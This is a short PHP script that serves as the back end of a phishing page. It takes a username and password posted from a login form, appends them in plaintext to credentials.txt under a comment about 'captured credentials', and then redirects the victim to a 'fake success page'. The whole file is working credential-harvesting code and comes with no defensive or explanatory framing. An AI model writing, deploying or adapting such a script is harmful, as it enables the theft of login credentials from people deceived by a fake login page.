<?php
if ($_SERVER["REQUEST_METHOD"] == "POST") {
    $username = $_POST['username'];
    $password = $_POST['password'];

    // Save the captured credentials to a file
    $file = fopen("credentials.txt", "a");
    fwrite($file, "Username: " . $username . "\nPassword: " . $password . "\n\n");
    fclose($file);

    // Redirect to a fake success page
    header("Location: success.html");
    exit();
}
?>
